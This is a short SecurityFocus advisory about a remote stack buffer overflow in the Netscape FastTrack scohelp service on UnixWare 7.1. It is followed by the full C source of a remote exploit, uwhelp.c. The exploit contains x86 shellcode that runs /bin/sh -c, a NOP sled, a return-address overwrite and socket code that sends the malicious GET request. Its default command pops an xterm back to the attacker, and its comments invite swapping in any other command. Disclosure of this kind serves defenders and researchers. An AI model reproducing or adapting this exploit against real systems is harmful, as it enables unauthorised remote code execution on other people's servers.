source: http://www.securityfocus.com/bid/908/info

The version of Netscape FastTrack server that ships with UnixWare 7.1 is vulnerable to a remote buffer overlow. By default, the httpd listens on port 457 of the UnixWare host and serves documentation via http. If you pass the server a GET request with more than 367 characters, the stack overflows and the EIP is overwritten making it possible to execute arbitrary code with the privileges of the httpd (usually nobody).

/** uwhelp.c - remote exploit for UnixWare's Netscape FastTrack =

 **            2.01a scohelp http service
 **
 ** Runs the command of your choice with uid of the http daemon
 ** (probably nobody).  If there are spaces in your command, use
 ** ${IFS} instead of a space.  httpd handles execve's strangely,
 ** so your best bet is to just exec an xterm as I've done below.
 ** Obviously, change the command below to suit your needs.
 **
 ** Compile on UW7.1: cc -o uwhelp uwhelp.c -lnsl -lsocket
 ** run: ./uwhelp hostname <offset> <size>
 **
 **
 ** Brock Tellier btellier@usa.net
 **
 **/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/errno.h>
#include <netdb.h>

#define BUFLEN 1000
#define NOP 0x90
#define LEN 102

char shell[] = /* Cheez Whiz, cheezbeast@hotmail.com */
"\xeb\x5f"                         /* jmp springboard       */
"\x9a\xff\xff\xff\xff\x07\xff"     /* lcall 0x7,0x0         */
"\xc3"                             /* ret                   */
"\x5e"                             /* popl %esi             */
"\x31\xc0"                         /* xor %eax,%eax         */
"\x89\x46\x9d"                     /* movl %eax,-0x63(%esi) */
"\x88\x46\xa2"                     /* movb %al,-0x5e(%esi)  */
"\x31\xc0"                         /* xor %eax,%eax         */
"\x50"                             /* pushl %eax            */
"\xb0\x8d"                         /* movb $0x8d,%al        */
"\xe8\xe5\xff\xff\xff"             /* call syscall          */
"\x83\xc4\x04"                     /* addl $0x4,%esp        */
"\x31\xc0"                         /* xor %eax,%eax         */
"\x50"                             /* pushl %eax            */
"\xb0\x17"                         /* movb $0x17,%al        */
"\xe8\xd8\xff\xff\xff"             /* call syscall          */
"\x83\xc4\x04"                     /* addl $0x4,%esp        */
"\x31\xc0"                         /* xor %eax,%eax         */
"\x50"                             /* pushl %eax            */
"\x56"                             /* pushl %esi            */
"\x8b\x1e"                         /* movl (%esi),%ebx      */
"\xf7\xdb"                         /* negl %ebx             */
"\x89\xf7"                         /* movl %esi,%edi        */
"\x83\xc7\x10"                     /* addl $0x10,%edi       */
"\x57"                             /* pushl %edi            */
"\x89\x3e"                         /* movl %edi,(%esi)      */
"\x83\xc7\x08"                     /* addl $0x8,%edi        */
"\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
"\x89\x7e\x04"                     /* movl %edi,0x4(%esi)   */
"\x83\xc7\x03"                     /* addl $0x3,%edi        */
"\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
"\x89\x7e\x08"                     /* movl %edi,0x8(%esi)   */
"\x01\xdf"                         /* addl %ebx,%edi        */
"\x88\x47\xff"                     /* movb %al,-0x1(%edi)   */
"\x89\x46\x0c"                     /* movl %eax,0xc(%esi)   */
"\xb0\x3b"                         /* movb $0x3b,%al        */
"\xe8\xa4\xff\xff\xff"             /* call syscall          */
"\x83\xc4\x0c"                     /* addl $0xc,%esp        */
"\xe8\xa4\xff\xff\xff"             /* call start            */
"\xff\xff\xff\xff"                 /* DATA                  */
"\xff\xff\xff\xff"                 /* DATA                  */
"\xff\xff\xff\xff"                 /* DATA                  */
"\xff\xff\xff\xff"                 /* DATA                  */
"\x2f\x62\x69\x6e\x2f\x73\x68\xff" /* DATA                  */
"\x2d\x63\xff";                    /* DATA                  */

char *auth=
" HTTP/1.0\r\n"
"Host: localhost:457\r\n"
"Accept: text/html\r\n"
"Accept-Encoding: gzip, compress\r\n"
"Accept-Language: en\r\n"
"Negotiate: trans\r\n"
"User-Agent: xnec\r\n";

char buf[BUFLEN];
char exploit[BUFLEN];
char *cmd = "/usr/X/bin/xterm${IFS}-display${IFS}unix:0.0";
int len,i,sock;
int size = 368;
int offset=300;
int port = 457;
long sp = 0xbffc6004;
//unsigned long sp = (unsigned long)&sp;
struct  sockaddr_in sock_a;
struct  hostent *host;

void main (int argc, char *argv[]) {
        =

 if(argc < 2) {
   fprintf(stderr, "Error:Usage: %s <hostname> \n", argv[0]);
   exit(0);
  }
 if(argc > 2) offset=atoi(argv[2]);
 if(argc > 3) size=atoi(argv[3]);
 =

 sp = sp + offset;

 memset(exploit, NOP, size - strlen(shell) - strlen(cmd)- 6);

 /* put size of *cmd into shellcode */
 len = strlen(cmd); len++; len = -len;
 shell[LEN+0] = (len >>  0) & 0xff;
 shell[LEN+1] = (len >>  8) & 0xff;
 shell[LEN+2] = (len >> 16) & 0xff;
 shell[LEN+3] = (len >> 24) & 0xff;

 memcpy(exploit+(size-strlen(shell)-strlen(cmd)-6), shell, strlen(shell))=
;
 memcpy(exploit+(size-strlen(cmd)-6), cmd,strlen(cmd));
 memcpy(exploit+(size-6),"\xff",1);
 =


 exploit[size-5]=(sp & 0x000000ff);
 exploit[size-4]=(sp & 0x0000ff00) >> 8;
 exploit[size-3]=(sp & 0x00ff0000) >> 16;
 exploit[size-2]=(sp & 0xff000000) >> 24;
 exploit[size-1]=0; =


 sprintf(buf, "GET /%s %s%s\r\n\r\n", exploit, auth,exploit);

 buf[BUFLEN - 1] = 0;

 fprintf(stderr, "httpd remote exploit for UnixWare 7.1\n");
 fprintf(stderr, "using addr 0x%x offset %d\n", sp, offset);
 fprintf(stderr, "Brock Tellier btellier@usa.net\n");

 if((host=(struct hostent *)gethostbyname(argv[1])) == NULL) {
    perror("gethostbyname"); =

    exit(-1);
  }
 =

 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0) {
    perror("create socket");
    exit(-1);
  }

 sock_a.sin_family=AF_INET;
 sock_a.sin_port=htons(port);
 memcpy((char *)&sock_a.sin_addr,(char *)host->h_addr,host->h_length);
 if(connect(sock,(struct sockaddr *)&sock_a,sizeof(sock_a))!=0) {
    perror("create connect");
    exit(-1);
  }

  fflush(stdout);

  // write exploit
  write(sock,buf,strlen(buf));

}